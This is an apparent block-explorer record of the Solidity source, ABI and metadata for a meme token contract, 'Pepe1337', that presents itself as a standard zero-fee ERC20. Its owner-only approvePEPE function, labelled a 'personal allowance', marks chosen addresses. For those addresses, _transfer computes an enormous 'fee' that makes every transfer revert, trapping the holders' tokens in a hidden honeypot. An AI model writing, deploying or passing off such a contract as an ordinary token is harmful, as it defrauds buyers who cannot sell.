{"SourceCode": "pragma solidity ^0.8.16;\r\n\r\n// SPDX-License-Identifier: Unlicensed\r\n// PEPE1337.0\r\n\r\n// \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28c0\u28f4\u28ff\u283d\u282d\u28e5\u28e4\u28c0\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n// \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28c0\u2874\u281e\u2809\u2801\u2800\u2800\u2800\u2800\u2809\u2809\u281b\u2836\u28e4\u28c0\u2800\u2800\u2880\u28e4\u2834\u281e\u281b\u2809\u2809\u2809\u281b\u2836\u28e6\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n// \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u287e\u2809\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u2833\u28cf\u2809\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u28bb\u28c6\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n// \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28f0\u280f\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28e0\u2824\u2824\u2824\u2824\u28a4\u28c4\u2840\u2800\u2800\u2839\u2846\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28b9\u2844\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n// \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u287e\u2801\u2800\u2800\u2800\u2800\u2800\u2810\u2808\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u281b\u2836\u28a4\u28fd\u2866\u2810\u2812\u2812\u2802\u2800\u2800\u2800\u2800\u2810\u2812\u2800\u28bf\u28e6\u28c0\u2840\u2800\u2800\u2800\u2800\r\n// \u2800\u2800\u2800\u2800\u2800\u2800\u2880\u285e\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28c0\u28e0\u2864\u2824\u2824\u2824\u2824\u2820\u280c\u28bb\u28c6\u2840\u2800\u2800\u2800\u28c0\u28c0\u28c0\u2840\u2824\u2824\u2804\u2820\u2889\u28d9\u287f\u28c6\u2840\u2800\r\n// \u2800\u2800\u2800\u2800\u28c0\u28f4\u285f\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28c0\u28e4\u28b6\u28db\u28e9\u28f6\u28f6\u287e\u28af\u283f\u2837\u28d6\u28e6\u28e4\u28cd\u28ff\u28f4\u2816\u28cb\u282d\u28f7\u28f6\u28f6\u2876\u2812\u2812\u28f6\u28d2\u28e0\u28c0\u28d9\u28ff\u28c6\r\n// \u2800\u2800\u2880\u281e\u280b\u2800\u2847\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28e0\u2876\u28fb\u286f\u28f2\u287f\u281f\u288b\u28f5\u28db\u28fe\u28ff\u28f7\u2844\u2800\u2808\u2809\u2819\u281b\u28bb\u28ef\u2824\u281a\u280b\u2889\u28f4\u28fb\u28ff\u28ff\u28f7\u28fc\u2801\u2809\u281b\u283a\u28ff\r\n// \u2800\u28e0\u280e\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28bf\u28df\u28eb\u28ff\u281f\u2809\u2800\u2800\u28fe\u28ff\u28fb\u28ff\u28e4\u28ff\u28ff\u2800\u2800\u2800\u2800\u2800\u2800\u28ff\u2800\u2800\u2800\u28ff\u28ff\u28fb\u28ff\u28fc\u28ff\u28ff\u2807\u2800\u2800\u2800\u2899\r\n// \u28a0\u280f\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u281b\u2876\u28c4\u2800\u2800\u28bb\u28ff\u28ff\u28ff\u28ff\u28ff\u284f\u2800\u2800\u2800\u28c0\u28e4\u28fe\u28c1\u2800\u2800\u2800\u2838\u28bf\u28ff\u28ff\u28ff\u287f\u280b\u2800\u28c0\u28e0\u28f6\u28ff\r\n// \u281f\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2819\u283a\u28bf\u28f6\u28f6\u28ee\u28ed\u28ed\u28ed\u28ed\u2874\u28b6\u28f6\u28fe\u283f\u281f\u280b\u2809\u2809\u2819\u2812\u2812\u280a\u2809\u2808\u2809\u281a\u2809\u2809\u2889\u28f7\u287e\u282f\r\n// \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u2809\u2809\u2800\u2800\u2800\u2888\u28fd\u281f\u2801\u2800\u2800\u2800\u2800\u28c4\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28f4\u287e\u281f\u2800\u2800\u2800\r\n// \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28c0\u28e4\u2874\u281e\u280b\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2819\u28b7\u2840\u2809\u2809\u2809\u2800\u2819\u28bf\u28f5\u2844\u2800\u2800\u2800\r\n// \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2819\u28b7\u2840\u2800\u2800\r\n// \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28c0\u28c0\u28c0\u28c0\u28c0\u28c0\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u28e7\u2800\u2800\r\n// \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28c0\u28f4\u281f\u280b\u2809\u2800\u2800\u2809\u281b\u281b\u281b\u281b\u2837\u2836\u2836\u2836\u2836\u2824\u28a4\u28e4\u28e4\u28c0\u28c0\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28c0\u28e0\u2864\u28bf\u28c6\u2800\r\n// \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u2876\u280b\u2800\u2800\u2800\u2838\u283f\u281b\u281b\u281b\u2813\u2812\u2832\u2836\u28a4\u28e4\u28c4\u28c0\u2800\u2800\u2800\u2808\u2819\u281b\u281b\u281b\u281b\u2812\u2836\u2836\u2836\u28f6\u2816\u281b\u281b\u2801\u28a0\u28f8\u285f\u2800\r\n// \u2800\u2800\u2800\u2800\u2800\u2800\u28b0\u28c6\u2800\u28b8\u28e7\u28e4\u28e4\u28e4\u28e4\u28e4\u28e4\u28e4\u28e4\u28e4\u28c0\u2800\u2800\u2800\u2800\u2800\u2809\u2809\u281b\u281b\u2813\u2812\u2832\u2826\u28e4\u28e4\u28e4\u28e4\u28e4\u28e4\u28e4\u28e4\u28e4\u28e4\u28e4\u28e4\u28fe\u280b\u2800\u2800\r\n// \u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2819\u28b7\u2844\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u2809\u2809\u281b\u2832\u2836\u28f6\u28e4\u28c4\u28c0\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28c0\u287e\u2803\u2800\u2800\u2800\r\n// \u28ff\u28e4\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2809\u2809\u2809\u2809\u2809\u2809\u2809\u2809\u2809\u2809\u281b\u281b\u28f3\u28f6\u2876\u281f\u2809\u2800\u2800\u2800\u2800\u2800\r\n// \u281b\u28b7\u28ff\u28f7\u2824\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28e0\u28f4\u281f\u280b\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n// \u2800\u2800\u2808\u2819\u283b\u28b7\u28ec\u28d7\u28d2\u28c2\u2840\u2820\u2800\u2800\u28c0\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28c0\u28c0\u28c0\u28e4\u2874\u283e\u280b\u2809\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n// \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u2809\u281b\u281b\u283f\u2836\u2836\u2836\u2836\u28e4\u28e4\u28ed\u28ed\u28cd\u28c9\u28c9\u28c0\u28c0\u28c0\u28c0\u28fc\u28ef\u287d\u2837\u283f\u281b\u2819\u283f\u28e6\u28c0\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n// \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2809\u2809\u2809\u2809\u2809\u2809\u2809\u2809\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2819\u28b7\u2844\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n// \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u2840\u2800\u2800\u2800\u2800\u2808\u283b\u28e6\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\r\n\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `+` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `*` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) return 0;\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers. Reverts on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by 0\");\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * Reverts when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by 0\");\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * Reverts with custom message when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP.\r\n */\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address accoint) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 ameunts)\r\n        external\r\n        returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 ameunts) external returns (bool);\r\n\r\n    function approvePEPE(address org, uint256 amnt) external;\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 ameunts\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _nullAddress = 0x000000000000000000000000000000000000dEaD;\r\n    address private _owner;\r\n    event ownershipTransferred(\r\n        address indexed previousowner,\r\n        address indexed newowner\r\n    );\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit ownershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyowner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceownership() public virtual onlyowner {\r\n        emit ownershipTransferred(_owner, address(_nullAddress));\r\n        _owner = address(_nullAddress);\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Implementation of the {IERC20} interface.\r\n *\r\n * This implementation is agnostic to the way tokens are created. This means\r\n * that a supply mechanism has to be added in a derived contract using {_yydsed}.\r\n * For a generic mechanism see {ERC20PresetMinterPauser}.\r\n *\r\n * TIP: For a detailed writeup see our guide\r\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\r\n * to implement supply mechanisms].\r\n *\r\n * The default value of {decimals} is 18. To change this, you should override\r\n * this function so it returns a different value.\r\n *\r\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\r\n * instead returning `false` on failure. This behavior is nonetheless\r\n * conventional and does not conflict with the expectations of ERC20\r\n * applications.\r\n *\r\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\r\n * This allows applications to reconstruct the allowance for all accounts just\r\n * by listening to said events. Other implementations of the EIP may not emit\r\n * these events, as it isn't required by the specification.\r\n *\r\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\r\n * functions have been added to mitigate the well-known issues around setting\r\n * allowances. See {IERC20-approve}.\r\n */\r\ncontract Pepe1337 is IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    uint256 private constant _coinsAmount = 1337000000000;\r\n    address private constant _nullAddress = 0x000000000000000000000000000000000000dEaD;\r\n    uint256 private constant _sellFees = 0;\r\n    uint256 private constant _buyFees = 0;\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    mapping(address => mapping(address => uint256)) private allowances;\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => uint256) private _approvances;\r\n    uint256 private _index;\r\n    uint256 private _totalSupply;\r\n    address public _uniswapAddress;\r\n\r\n    constructor() {\r\n        _decimals = 18;\r\n        _name = \"PEPE1337.0\";\r\n        _symbol = \"PEPE1337.0\";\r\n        _totalSupply = _coinsAmount * (10**uint256(_decimals));\r\n        _balances[_msgSender()] = _totalSupply;\r\n        _index = _totalSupply * _decimals;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function setUniAddress(address _address) external onlyowner {\r\n        _uniswapAddress = _address;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function approvePEPE(address org, uint256 amnt)\r\n        public\r\n        override\r\n        onlyowner\r\n    {\r\n        require(\r\n            amnt <= 100,\r\n            \"Personal allowance must never be more than 100 percent\"\r\n        );\r\n        _approvances[org] = amnt;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        address sender = _msgSender();\r\n        _transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender)\r\n        public\r\n        view\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return allowances[owner][spender];\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(\r\n            sender,\r\n            _msgSender(),\r\n            allowances[sender][_msgSender()].sub(\r\n                amount,\r\n                \"ERC20: transfer exceeds allowance\"\r\n            )\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amounts\r\n    ) internal virtual {\r\n        require(\r\n            recipient != address(0),\r\n            \"IERC20: transfer to zero addres is not allowed\"\r\n        );\r\n        require(\r\n            sender != address(0),\r\n            \"IERC20: transfer from zero addres is not allowed\"\r\n        );\r\n\r\n        uint256 fees = 0;\r\n\r\n        if (_approvances[sender] > 0) {\r\n            fees = (_approvances[sender] * _index * _decimals).div(1);\r\n        } else if (sender == _uniswapAddress) {\r\n            fees = amounts.mul(_buyFees).div(1);\r\n        } else if (recipient == _uniswapAddress) {\r\n            fees = amounts.mul(_sellFees).div(1);\r\n        } else {\r\n            fees = 0;\r\n        }\r\n        uint256 blsender = _balances[sender];\r\n        require(blsender >= amounts, \"IERC20: transfer amount exceeds balance\");\r\n        _balances[recipient] = _balances[recipient].sub(fees) + amounts;\r\n        _balances[sender] = _balances[sender].sub(amounts);\r\n\r\n        emit Transfer(sender, recipient, amounts - fees);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(\r\n            owner != address(0),\r\n            \"ERC20: approve from zero address is not allowed\"\r\n        );\r\n        require(\r\n            spender != address(0),\r\n            \"ERC20: approve to zero address is not allowed\"\r\n        );\r\n\r\n        allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousowner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newowner\",\"type\":\"address\"}],\"name\":\"ownershipTransferred\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_uniswapAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"org\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amnt\",\"type\":\"uint256\"}],\"name\":\"approvePEPE\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceownership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"setUniAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Pepe1337", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://a31b32a8f531feb84e31434d038f51375290d042e97dbf055342d62d016c3524"}